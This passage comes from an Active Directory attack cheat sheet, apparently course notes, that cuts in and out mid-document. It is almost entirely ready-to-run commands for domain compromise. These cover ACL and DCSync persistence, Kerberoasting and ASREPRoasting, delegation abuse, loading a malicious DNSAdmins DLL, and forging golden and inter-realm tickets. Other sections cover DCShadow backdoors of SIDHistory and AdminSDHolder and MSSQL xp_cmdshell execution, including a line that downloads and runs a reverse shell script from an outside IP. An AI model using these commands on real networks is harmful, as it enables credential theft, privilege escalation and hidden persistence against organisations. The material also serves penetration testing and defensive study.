PS C:\> Set-ADAccountPassword -Identity <username> -NewPassword (ConvertTo-SecureString "<new-password>" -AsPlainText -Force) -Verbose
```

### Rights Abuse (Persistence using ACLs)

- Add FullControl permissions for a user to the ACL of the domain root using PowerView as Domain Admin

```
PS C:\> Add-ObjectAcl -TargetDistinguishedName 'DC=test,DC=domain,DC=local' -PrincipalSamAccountName <username> -Rights All -Verbose
```

- Add FullControl permissions for a user to the ACL of the domain root using ActiveDirectory Module and Set-ADACL as Domain Admin

```
PS C:\> Set-ADACL -DistinguishedName 'DC=test,DC=domain,DC=local' -Principal <username> -Verbose
```

- Add DCSync rights for a user to the ACL of the domain root using PowerView as Domain Admin

```
PS C:\> Add-ObjectAcl -TargetDistinguishedName 'DC=test,DC=domain,DC=local' -PrincipalSamAccountName <username> -Rights DCSync -Verbose

# 3 permissions: Replicating Directory Changes, Replicating Directory Changes All, Replicating Directory Changes In Filtered Set
```

- Add DCSync rights for a user to the ACL of the domain root using ActiveDirectory Module and Set-ADACL as Domain Admin

```
PS C:\> Set-ADACL -DistinguishedName 'DC=test,DC=domain,DC=local' -Principal <username> -GUIDRight DCSync -Verbose

# 3 permissions: Replicating Directory Changes, Replicating Directory Changes All, Replicating Directory Changes In Filtered Set
```

- Check if we have replication rights required to run DCSync

```
PS C:\> Get-ObjectAcl -DistinguishedName "dc=test,dc=domain,dc=local" -ResolveGUIDs | ? {($_.IdentityReference -match "<username>") -and (($_.ObjectType -match 'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll'))}
```

- Execute DCSync

```
PS C:\> Invoke-Mimikatz -Command '"lsadump::dcsync /user:<Domain>\krbtgt"'
PS C:\> Invoke-Mimikatz -Command '"lsadump::dcsync /user:<Domain>\Administrator"'        # Can be used for any user
```

### Security Descriptors (Persistence using ACLs)

- Enable our user the ability to execute WMI queries on a target machine e.g. Domain Controller even without having Administrative privileges using the GUI as a Domain Admin. Consists of two parts: must have the privileges to connect to the DCOM endpoint, and must have the privileges to connect to the namespace

```
DCOM endpoint: Start Menu -> Component Service -> Computers -> My Computer -> Properties -> COM Security Tab -> Access Permissions -> Edit Links -> Add our user -> Click Allow for everything

Namespace: Start Menu -> Computer Management -> Services and Applications -> WMI Control -> Properties -> Security Tab -> Root -> Security -> Add our user -> Click Allow for everything -> Advanced -> Select our user -> Edit -> Applies to 'This namespace and subnamespaces'
```

- Enable our user the ability to execute WMI queries on a target machine e.g. Domain Controller even without having Administrative privileges using PowerShell commands (modify ACLs to allow non-admin users access to securable objects) as Domain Admin

```
PS C:\> Set-RemoteWMI -UserName <username> -Verbose        # On local machine for <username>

PS C:\> Set-RemoteWMI -UserName <username> -ComputerName <Domain Controller> -namespace 'root\cimv2' -Verbose        # On remote machine for <username> without explicit credentials

PS C:\> Set-RemoteWMI -UserName <username> -ComputerName <Domain Controller> -Credential Administrator -namespace 'root\cimv2' -Verbose        # On remote machine with explicit credentials. Only root\cimv2 and nested namespaces

PS C:\> Set-RemoteWMI -UserName <username> -ComputerName <Domain Controller> -namespace 'root\cimv2' -Remove -Verbose        # On remote machine, remove the permissions
```

- Check if you can execute WMI queries

```
PS C:\> Get-Wmiobject -Class win32_operatingsystem -ComputerName <Domain Controller>
```

- Enable our user the ability to execute PowerShell Remoting to a target machine e.g. Domain Controller even without having Administrative privileges using PowerShell commands (modify ACLs to allow non-admin users access to securable objects) as Domain Admin

```
PS C:\> Set-RemotePSRemoting -UserName <username> -Verbose        # On local machine for <username>

PS C:\> Set-RemotePSRemoting -UserName <username> -ComputerName <Domain Controller> -Verbose        # On remote machine for <username> without credentials

PS C:\> Set-RemotePSRemoting -UserName <username> -ComputerName <Domain Controller> -Remove        # On remote machine, remove the permissions
```

- Modify our user permissions on the Remote Registry service, and multiple registry keys on a target machine e.g. Domain Controller even without having Administrative privileges using PowerShell commands (modify ACLs to allow non-admin users access to securable objects) as Domain Admin

```
PS C:\> Add-RemoteRegBackdoor -ComputerName <Domain Controller> -Trustee <username> -Verbose        # Using DAMP (https://github.com/HarmJ0y/DAMP), with Administrative privileges on remote machine

PS C:\> Get-RemoteMachineAccountHash -ComputerName <Domain Controller> -Verbose        # As <username>, retrieve machine account hash

PS C:\> Get-RemoteLocalAccountHash -ComputerName <Domain Controller> -Verbose        # Retrieve local account hash

PS C:\> Get-RemoteCachedCredential -ComputerName <Domain Controller> -Verbose        # Retrieve domain cached credentials
```

Domain Privilege Escalation
-----------------------------------------

### Kerberoast

- Find user accounts used as Service accounts using PowerView

```
PS C:\> Get-NetUser -SPN        # Can also use https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1
```

- Find user accounts used as Service accounts using ActiveDirectory Module

```
PS C:\> Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

- Request a TGS

```
PS C:\> Add-Type -AssemblyName System.IdentityModel 
PS C:\> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/test-mgmt.test.domain.local"        # Request-SPNTicket from PowerView can be used as well for cracking with John or Hashcat
```

- Display a list of currently cached Kerberos tickets, to confirm the TGS is there

```
PS C:\> klist
```

- Export all tickets using Mimikatz

```
PS C:\> Invoke-Mimikatz -Command '"kerberos::list /export"'
```

- Crack the Service account password

```
PS C:\> python.exe .\tgsrepcrack.py <wordlist> .\2-40a10000-student1@MSSQLSvc~test-mgmt.test.domain.local-TEST.DOMAIN.LOCAL.kirbi
```

### ASREPRoast

- Enumerate accounts with Kerberos preauthentication disabled using PowerView_dev

```
PS C:\> Get-DomainUser -PreauthNotRequired -Verbose
```

- Enumerate accounts with Kerberos preauthentication disabled using ActiveDirectory Module

```
PS C:\> Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth
```

- Enumerate the permissions for RDPUsers on ACLs that may allow us to forcibly disable Kerberos preauthentication using PowerView_dev (look for GenericAll or GenericWrite)

```
PS C:\> Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
```

- Forcibly disable Kerberos preauthentication on a user we have permissions over using PowerView_dev, then check if it worked

```
PS C:\> Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

- Request encrypted AS-REP for offline brute-force

```
PS C:\> Get-ASREPHash -UserName <username> -Verbose
```

- Enumerate all users with Kerberos preauthentication disabled and request a hash

```
PS C:\> Invoke-ASREPRoast -Verbose
```

- Crack the hash offline using John

```
PS C:\> ./john hash.txt --wordlist=wordlist.txt
```

### Set SPN

- Enumerate the permissions for RDPUsers on ACLs using PowerView_dev (look for GenericAll or GenericWrite)

```
PS C:\> Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
```

- Check if the user already has a SPN using PowerView_dev

```
PS C:\> Get-DomainUser -Identity <username> | select serviceprincipalname
```

- Check if the user already has a SPN using ActiveDirectory Module

```
PS C:\> Get-ADUser -Identity <username> -Properties ServicePrincipalName | select ServicePrincipalName
```

- Set a SPN for the user (must be unique for the domain) using PowerView_dev

```
PS C:\> Set-DomainObject -Identity <username> -Set @{serviceprincipalname='ops/whatever1'}
```

- Set a SPN for the user (must be unique for the domain) using ActiveDirectory Module

```
PS C:\> Set-ADUser -Identity <username> -ServicePrincipalNames @{Add='ops/whatever1'}
```

- Request a TGS

```
PS C:\> Add-Type -AssemblyName System.IdentityModel 
PS C:\> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ops/whatever1"        # Request-SPNTicket from PowerView can be used as well for cracking with John or Hashcat
```

- Display a list of currently cached Kerberos tickets, to confirm the TGS is there

```
PS C:\> klist
```

- Export all tickets using Mimikatz

```
PS C:\> Invoke-Mimikatz -Command '"kerberos::list /export"'
```

- Crack the Service account password

```
PS C:\> python.exe .\tgsrepcrack.py <wordlist> .\4-40a10000-studentadmin@ops~whatever1-TEST.DOMAIN.LOCAL.kirbi
```

### Unconstrained Delegation

- Discover domain computers which have unconstrained delegation enabled using PowerView (must have Administrative privileges on them so we can extract TGT's)

```
PS C:\> Get-NetComputer -UnConstrained        # Domain Controllers will always show up as having unconstrained delegation, so ignore them
```

- Discover domain computers and users (must have Administrative privileges on them) which have unconstrained delegation enabled using ActiveDirectory Module

```
PS C:\> Get-ADComputer -Filter {TrustedForDelegation -eq $True}        # Domain Controllers will always show up as having unconstrained delegation, so ignore them
PS C:\> Get-ADUser -Filter {TrustedForDelegation -eq $True}
```

- Compromise the server where unconstrained delegation is enabled, then check if any Domain Admin or high value target TGT is available (save this in a new directory, as it is easier to view the tickets when saved to disk)

```
PS C:\> Invoke-Mimikatz -Command '"sekurlsa::tickets /export"

PS C:\> rm -Force *.kirbi        # To delete the tickets
```

- Monitor for 100 seconds with a delay of 5 seconds for any incoming sessions on our compromised machine with unconstrained delegation from the user called Administrator

```
PS C:\> Invoke-UserHunter -ComputerName <compromised-computer> -Poll 100 -UserName Administrator -Delay 5 -Verbose
```

- Save the tickets to disk once a Domain Admin or high value target connects to a service on our compromised box

```
PS C:\> Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
```

- Reuse the Domain Admin or high value target ticket using ptt

```
PS C:\> Invoke-Mimikatz -Command '"kerberos::ptt C:\Users\appadmin\Documents\user1\[0;2ceb8b3]-2-0-60a10000-Administrator@krbtgt-TEST.DOMAIN.LOCAL.kirbi"'
```

- Monitor every 5 seconds for any incoming sessions on our compromised machine with unconstrained delegation using Rubeus (https://github.com/GhostPack/Rubeus)

```
PS C:\> .\Rubeus.exe monitor /interval:5 /nowrap
```

- Run MS-RPRN.exe (https://github.com/leechristensen/SpoolSample) on our attacking machine to entice the Domain Controller to connect to the machine with unconstrained delegation using the Printer Bug 

```
PS C:\> .\MS-RPRN.exe \\test-dc.test.domain.local \\test-appsrv.test.domain.local
```

- Copy the base64 encoded TGT, remove extra spaces (if any), and use it on our attacking machine

```
PS C:\> .\Rubeus.exe ptt /ticket:<base64 encoded ticket>
```

- Run DCSync once the ticket is injected to confirm we are running as Domain Admin

```
PS C:\> Invoke-Mimikatz -Command '"lsadump::dcsync /user:test\krbtgt"'
```

### Constrained Delegation

- Discover computers and users which have constrained delegation enabled using PowerView_dev (make sure to check the UserAccountControl field to see if the object has TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION, and make sure to check msDS-AllowedToDelegateTo field to see what service the object can delegate to)

```
PS C:\> Get-DomainComputer -TrustedToAuth
PS C:\> Get-DomainUser -TrustedToAuth
```

- Discover computers and users which have constrained delegation enabled using ActiveDirectory Module (make sure to check the UserAccountControl field to see if the object has TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION, and make sure to check msDS-AllowedToDelegateTo field to see what service the object can delegate to)

```
PS C:\> Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
```

- Request a TGT using asktgt from Kekeo (must have either the plaintext password or NTLM hash of the account that has constrained delegation enabled e.g. websvc account in our scenario)

```
PS C:\> .\kekeo.exe
kekeo # tgt::ask /user:websvc /domain:<Domain Name> /rc4:cc098f204c5887eaa8253e7c2749156f
```

- Use the TGT to request a TGS as ANY user e.g. Administrator using S4U from Kekeo for a service the account (websvc) has access to through constrained delegation

```
kekeo # tgs::s4u /tgt:TGT_websvc@TEST.DOMAIN.LOCAL_krbtgt~test.domain.local@TEST.DOMAIN.LOCAL.kirbi /user:Administrator@test.domain.local /service:cifs/test-mssql.test.domain.LOCAL
```

- Use Mimikatz to ptt the TGS

```
PS C:\> Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@test.domain.local@TEST.DOMAIN.LOCAL_cifs~test-mssql.test.domain.LOCAL@TEST.DOMAIN.LOCAL.kirbi"'
```

- Confirm we have access to the CIFS service as Administrator (will only have access to the file system)

```
PS C:\> ls \\test-mssql.test.domain.local\c$
```

- Abuse constrained delegation using Rubeus by requesting a TGT and TGS in a single command

```
PS C:\> .\Rubeus.exe s4u /user:websvc /rc4:cc098f204c5887eaa8253e7c2749156f /impersonateuser:Administrator /msdsspn:"CIFS/test-mssql.test.domain.LOCAL" /ptt

PS C:\> ls \\test-mssql.test.domain.local\c$        # To confirm we have access
```

### Alternate Service Constrained Delegation

- Request a TGT using asktgt from Kekeo (must have either the plaintext password or NTLM hash of the account that has constrained delegation enabled

```
PS C:\> .\kekeo.exe
kekeo # tgt::ask /user:test-adminsrv$ /domain:<Domain Name> /rc4:1fadb1b13edbc5a61cbdc389e6f34c67
```

- Use the TGT to request a TGS as ANY user e.g. Administrator using S4U from Kekeo_one (no SNAME validation) for a service the machine has access to through constrained delegation, and request an alternate TGS ticket for the LDAP service

```
kekeo # tgs::s4u /tgt:TGT_test-adminsrv$@TEST.DOMAIN.LOCAL_krbtgt~test.domain.local@TEST.DOMAIN.LOCAL.kirbi /user:Administrator@test.domain.local /service:time/test-dc.test.domain.LOCAL | ldap/test-dc.test.domain.LOCAL
```

- Use Mimikatz to ptt the TGS

```
PS C:\> Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@test.domain.local@TEST.DOMAIN.LOCAL_ldap~test-dc.test.domain.LOCAL@TEST.DOMAIN.LOCAL_ALT.kirbi"'
```

- Use DCSync feature without having Domain Admin privileges to get the krbtgt hash

```
PS C:\> Invoke-Mimikatz -Command '"lsadump::dcsync /user:test\krbtgt"'
```

- Abuse alternate service constrained delegation using Rubeus by requesting a TGT and TGS in a single command

```
PS C:\> .\Rubeus.exe s4u /user:test-adminsrv$ /rc4:1fadb1b13edbc5a61cbdc389e6f34c67 /impersonateuser:Administrator /msdsspn:"time/test-dc.test.domain.LOCAL" /altservice:ldap /ptt

PS C:\> Invoke-Mimikatz -Command '"lsadump::dcsync /user:test\krbtgt"'        # To confirm we can run DCSync
```

### DNSAdmins

- Enumerate the memebers of the DNSAdmins group using PowerView, then compromise a member of this group

```
PS C:\> Get-NetGroupMember -GroupName "DNSAdmins"
```

- Enumerate the memebers of the DNSAdmins group using ActiveDirectory Module, then compromise a member of this group

```
PS C:\> Get-ADGroupMember -Identity DNSAdmins
```

- Configure DLL using dnscmd.exe (needs RSAT DNS), using a member of the DNSAdmins group (make sure mimilib.dll is shared with Everyone = right-click a folder -> Properties -> Sharing -> Share -> Everyone = Read Permission Level)

```
PS C:\> dnscmd <Domain Controller> /config /serverlevelplugindll \\172.16.50.100\dll\mimilib.dll        # By default, the mimilib.dll logs all DNS queries to C:\Windows\System32\kiwidns.log on the target. Can also modify kdns.c for our own payload
```

- Use DNSServer module (needs RSAT DNS), using a member of the DNSAdmins group (make sure mimilib.dll is shared with Everyone = right-click a folder -> Properties -> Sharing -> Share -> Everyone = Read Permission Level)

```
PS C:\> $dnsettings = Get-DnsServerSetting -ComputerName <Domain Controller> -Verbose -All
PS C:\> $dnsettings.ServerLevelPluginDll = "\\172.16.50.100\dll\mimilib.dll"
PS C:\> Set-DnsServerSetting -InputObject $dnsettings -ComputerName <Domain Controller> -Verbose        # By default, the mimilib.dll logs all DNS queries to C:\Windows\System32\kiwidns.log on the target. Can also modify kdns.c for our own payload
```

- Restart the DNS service (assuming the DNSAdmins group has the permission to do so) - By default, the mimilib.dll logs all DNS queries to C:\Windows\System32\kiwidns.log

```
PS C:\> sc \\<Domain Controller> stop dns
PS C:\> sc \\<Domain Controller> start dns
```

### DA to EA: Child to Parent (Trust Tickets)

- Dump the trust key

```
PS C:\> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName <Domain Controller>        # Trust key will be under [In] Child -> Parent, then under rc4_hmac_nt
OR
PS C:\> Invoke-Mimikatz -Command '"lsadump::dcsync /user:test\test2$"'        # Trust key will be under Credentials -> Hash NTLM
```

- Forge an inter-realm TGT (Parent DC will trust anything in the TGT, so write SID history of Enterprise Admins group) (make sure to remove past tickets you have saved, otherwise it will error)

```
PS C:\> Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<Current Domain> /sid:<SID of current domain> /sids:<SID of the Enterprise Admins group of the parent domain> /rc4:<RC4 of the trust key> /service:krbtgt /target:<Parent Domain Name> /ticket:<Path where ticket is to be saved e.g. C:\AD\Tools\kekeo_old\trust_tkt.kirbi>"'
```

- Request a TGS for any service (CIFS below) in the target domain using the forged inter-realm TGT and kekeo_old

```
PS C:\> .\asktgs.exe C:\AD\Tools\kekeo_old\trust_tkt.kirbi CIFS/test2-dc.domain.local        # Tickets for other services (like HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting and WinRM) can be created as well
```

- Inject the TGS to access the targeted service (CIFS below) (may need to use it twice)

```
PS C:\> .\kirbikator.exe lsa .\CIFS.test2-dc.domain.local.kirbi
```

- Check if the TGS is available

```
PS C:\> klist
```

- Attempt to access the resource we requested access to

```
PS C:\> ls \\test2-dc.domain.local\c$
```

- Request a TGS for any service (CIFS below) in the target domain using the forged inter-realm TGT and Rubeus

```
PS C:\> .\Rubeus.exe asktgs /ticket:C:\AD\Tools\kekeo_old\trust_tkt.kirbi /service:cifs/test2-dc.domain.local /dc:test2-dc.domain.local /ptt

PS C:\> ls \\test2-dc.domain.local\c$
```

### DA to EA: Child to Parent (Krbtgt Hash)

- Dump the trust key

```
PS C:\> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName <Domain Controller>        # Trust key will be under [In] Child -> Parent, then under rc4_hmac_nt
OR
PS C:\> Invoke-Mimikatz -Command '"lsadump::dcsync /user:test\test2$"'        # Trust key will be under Credentials -> Hash NTLM
```

- Forge an inter-realm TGT (Parent DC will trust anything in the TGT, so write SID history of Enterprise Admins group) (make sure to remove past tickets you have saved, otherwise it will error)

```
PS C:\> Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<Current Domain> /sid:<SID of current domain> /sids:<SID of the Enterprise Admins group of the parent domain> /krbtgt:<krbtgt hash> /ticket:<Path where ticket is to be saved e.g. C:\AD\Tools\krbtgt_tkt.kirbi>"'

PS C:\> Invoke-Mimikatz -Command '"kerberos::golden /user:test-dc$ /domain:<Current Domain> /sid:<SID of current domain> /groups:516 /sids:<SID of the Domain Controllers Group,SID of Enterprise Domain Controllers Group> /krbtgt:<krbtgt hash> /ptt"'        # To avoid suspicious logs

# /sids is forcefully setting the SID History for the Enterprise Admin group for test.domain.local that is the Forest Enterprise Admin Group
```

- Inject the inter-realm TGT

```
PS C:\> Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\Tools\krbtgt_tkt.kirbi"'
```

- Attempt to access any resource

```
PS C:\> ls \\test2-dc.domain.local\c$

PS C:\> gwmi -class win32_operatingsystem -ComputerName test2-dc.domain.local
```

- Dump the krbtgt hash of the parent domain

```
PS C:\> Invoke-Mimikatz -Command '"lsadump::dcsync /user:test2\krbtgt /domain:domain.local"'
PS C:\> Invoke-Mimikatz -Command '"lsadump::dcsync /user:test2\Administrator /domain:domain.local"'        # To dump the Administrator hash
```

Cross Forest Attacks
-----------------------------------------

### Trust Tickets

- Dump the trust key

```
PS C:\> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName <Domain Controller>        # Trust key will be under [In] Current -> Forest, then under rc4_hmac_nt
OR
PS C:\> Invoke-Mimikatz -Command '"lsadump::dcsync /user:test\test3$"'        # Trust key will be under Credentials -> Hash NTLM
OR
PS C:\> Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName <Domain Controller>        # Trust key will be under ecorp$
```

- Forge an inter-realm TGT

```
PS C:\> Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<Current Domain> /sid:<SID of current domain> /rc4:<RC4 of the trust key> /service:krbtgt /target:<target Forest Name> /ticket:<Path where ticket is to be saved e.g. C:\AD\Tools\kekeo_old\trust_forest_tkt.kirbi>"'
```

- Request a TGS to the external forest for any service (CIFS below) using the forged inter-realm TGT and kekeo_old

```
PS C:\> .\asktgs.exe C:\AD\Tools\kekeo_old\trust_forest_tkt.kirbi CIFS/test3-dc.domain2.local        # Tickets for other services (like HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting and WinRM) can be created as well
```

- Inject the TGS to access the targeted service (CIFS below) (may need to use it twice)

```
PS C:\> .\kirbikator.exe lsa .\CIFS.test3-dc.domain2.local.kirbi
```

- Check if the TGS is available

```
PS C:\> klist
```

- Attempt to access the resource we requested access to

```
PS C:\> ls \\test3-dc.domain2.local\SharedwithTest\
```

- Request a TGS for any service (CIFS below) in the target domain using the forged inter-realm TGT and Rubeus

```
PS C:\> .\Rubeus.exe asktgs /ticket:C:\AD\Tools\kekeo_old\trust_forest_tkt.kirbi /service:cifs/test3-dc.domain2.local /dc:test3-dc.domain2.local /ptt

PS C:\> ls \\test3-dc.domain2.local\SharedwithTest\
```

### MSSQL Servers

- PowerUpSQL link

https://github.com/NetSPI/PowerUpSQL

- Import the PowerUpSQL module

```
PS C:\> Import-Module .\PowerUpSQL-master\PowerUpSQL.psd1
```

- Enumerate MSSQL instances (SPN scanning) (looks for SPN's starting with MSSQL)

```
PS C:\> Get-SQLInstanceDomain
```

- Check accessibility as current user

```
PS C:\> Get-SQLConnectionTestThreaded
OR
PS C:\> Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
```

- Gather information about the MSSQL instance

```
PS C:\> Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
```

- Checking for links to remote servers (make sure to check DatabaseLinkLocation)

```
PS C:\> Get-SQLServerLink -Instance test-mssql -Verbose
OR
select * from master..sysservers        # MSSQL query (heidisql -> Network Type: Microsoft SQL Server (TCP/IP) -> Hostname: test-mssql -> Use Windows Authentication -> Open -> Query -> select * from master..sysservers -> Play Button
```

- Enumerating database links manually

```
PS C:\> Get-SQLServerLinkCrawl -Instance test-mssql -Verbose
OR
select * from openquery("test-sql1",'select * from master..sysservers')        # MSSQL query - Openquery() function can be used to run queries on a linked database.
OR
select * from openquery("test-sql1",'select * from openquery("test-mgmt", ''select * from master..sysservers'')')        # MSSQL query - They can be chanined together to access links within links (nested links)
```

- Enable xp_cmdshell so we can execute commands on the target server (On the target server, either xp_cmdshell should already be enabled, or if rpcout is enabled on the last node (disabled by default), xp_cmdshell can be enabled using the below command)

```
EXECUTE('sp_configure "xp_cmdshell",1;reconfigure;') AT "eu-sql"        # MSSQL query
```

- Execute commands using xp_cmdshell (output will be in the CustomQuery field)

```
PS C:\> Get-SQLServerLinkCrawl -Instance test-mssql -Query "exec master..xp_cmdshell 'whoami'"
OR
PS C:\> Get-SQLServerLinkCrawl -Instance test-mssql -Query "exec master..xp_cmdshell 'whoami'" | ft        # Better formatting
OR
PS C:\> Get-SQLServerLinkCrawl -Instance test-mssql -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.X/Invoke-PowerShellTcp.ps1'')"'        # Reverse shell
OR
select * from openquery("test-sql1", 'select * from openquery("test-mgmt", "select * from openquery("eu-sql", ""select @@ version as version;exec master..xp_cmdshell "powershell whoami)"")")')        # MSSQL query - from the initial SQL server, OS commands can be executed using nested link queries. The quotes double between the SQL select statements e.g. 1, 2, 4
```

Forest Persistence
-----------------------------------------

### DCShadow

- Use Mimikatz to start the RPC servers with SYSTEM privileges (right-click -> Run as administrator) and specify attributes to be modified, and then use a second instance of Mimikatz with enough privileges (Domain Admin or similar) to push the values (right-click -> Run as administrator -> PtH)

```
 - Mimikatz1 (RPC servers - Needs SYSTEM privileges)
mimikatz # !+
mimikatz # !processtoken
mimikatz # token::whoami        # Check if SYSTEM
mimikatz # lsadump::dcshadow /object:root1user /attribute:Description /value:="Hello from DCShadow"

- Mimikatz2 (Push - Needs Domain Admin or similar)
mimikatz # privilege::debug
mimikatz # sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:71d04f9d50ceb1f64de7a09f23e6dc4c /impersonate
mimikatz # lsadump::dcshadow /push
```

### DCShadow Minimal Permissions

- Use DCShadow from machine mcorp-student1 as user student1 to modify root1user object (needs Domain Admin privileges)

```
PS C:\> Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:71d04f9d50ceb1f64de7a09f23e6dc4c /run:powershell.exe"'
PS C:\> Set-DCShadowPermissions -FakeDC mcorp-student1 -SAMAccountName root1user -Username student1 -Verbose

# Now, the second Mimikatz instance (which runs as Domain Admin) is not required
# You can use Set-DCShadowPermissions to give these privileges to an unprivileged user (notice that this will leave some logs). This is much more restrictive than having Domain Admin privileges. This means that the username student1 when logged on to the machine mcorp-student1 has DCShadow permissions over the object root1user.

 - Mimikatz1 (RPC servers - Needs SYSTEM privileges)
mimikatz # !+
mimikatz # !processtoken
mimikatz # token::whoami        # Check if SYSTEM
mimikatz # lsadump::dcshadow /object:root1user /attribute:Description /value:="Hello from DCShadow without DA"

- Mimikatz2 (Push - Can be run as student1) (right-click -> Run as administrator)
mimikatz # lsadump::dcshadow /push
```

- Set SIDHistory of a user account to Enterprise Admins or Domain Admins group

```
 - Mimikatz1 (RPC servers - Needs SYSTEM privileges)
mimikatz # !+
mimikatz # !processtoken
mimikatz # token::whoami        # Check if SYSTEM
mimikatz # lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-5-21-560323961-2032768757-2425134131-519

- Mimikatz2 (Push - Needs Domain Admin or similar)
mimikatz # privilege::debug
mimikatz # sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:71d04f9d50ceb1f64de7a09f23e6dc4c /impersonate
mimikatz # lsadump::dcshadow /push
OR
PS C:\> Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:71d04f9d50ceb1f64de7a09f23e6dc4c /run:powershell.exe"'
PS C:\> Set-DCShadowPermissions -FakeDC mcorp-student1 -SAMAccountName root1user -Username student1 -Verbose        # To use without Domain Admin
- Mimikatz2 (Push - Can be run as student1) (right-click -> Run as administrator)
mimikatz # lsadump::dcshadow /push        # Do not need Domain Admin
```

- Set primaryGroupID of a user account to Enterprise Admins or Domain Admins group (After the command is used, the user shows up as a member of the Enterprise Admins group in some enumeration techniques such as net group "Enterprise Admins" /domain)

```
 - Mimikatz1 (RPC servers - Needs SYSTEM privileges)
mimikatz # !+
mimikatz # !processtoken
mimikatz # token::whoami        # Check if SYSTEM
mimikatz # lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519

- Mimikatz2 (Push - Needs Domain Admin or similar)
mimikatz # privilege::debug
mimikatz # sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:71d04f9d50ceb1f64de7a09f23e6dc4c /impersonate
mimikatz # lsadump::dcshadow /push        # Need Domain Admin
OR
PS C:\> Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:71d04f9d50ceb1f64de7a09f23e6dc4c /run:powershell.exe"'
PS C:\> Set-DCShadowPermissions -FakeDC mcorp-student1 -SAMAccountName root1user -Username student1 -Verbose        # To use without Domain Admin
- Mimikatz2 (Push - Can be run as student1) (right-click -> Run as administrator)
mimikatz # lsadump::dcshadow /push        # Do not need Domain Admin
```

- Modify ntSecurityDescriptor for AdminSDHolder to add Full Control for a user

```
# First, get the ACE of an admin already in the Security Descriptor Definition Language (SDDL) of AdminSDHolder: SY, BA, DA or -519 e.g. (A;;CCDCLCSWRPWPLOCRSDRCWDWO;;;BA)
PS C:\> (New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=domain,DC=local")).psbase.ObjectSecurity.sddl | Set-Clipboard

# Second, we just need to append a Full Control ACE from above for SY, BA, or DA with our user's SID at the end e.g. (A;;CCDCLCSWRPWPLOCRSDRCWDWO;;;S-1-5-21-1874506631-3219952063-538504511-45138)

 - Mimikatz1 (RPC servers)
mimikatz # !+
mimikatz # !processtoken
mimikatz # token::whoami        # Check if SYSTEM
mimikatz # lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=domain,DC=local /attribute:ntSecurityDescriptor /value:O:DAG:DAD:PAI(A;;LCRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)(A;;CCDCLCSWRPWPLOCRSDRCWDWO;;;BA)(A;;CCDCLCSWRPWPLOCRRCWDWO;;;DA)(A;;CCDCLCSWRPWPLOCRRCWDWO;;;S-1-5-21-280534878-1496970234-700767426-519)(OA;;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;;WD)(OA;CI;RPWPCR;91e647de-d96f-4b70-9557-d63ff4f3ccd8;;PS)(OA;;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;;PS)(OA;;RP;4c164200-20c0-11d0-a768-00aa006e0529;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;;RP;037088f8-0ae1-11d2-b422-00a0c968f939;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;LCRPLORC;;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;;LCRPLORC;;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;;RP;037088f8-0ae1-11d2-b422-00a0c968f939;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;;RP;4c164200-20c0-11d0-a768-00aa006e0529;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;;RP;46a9b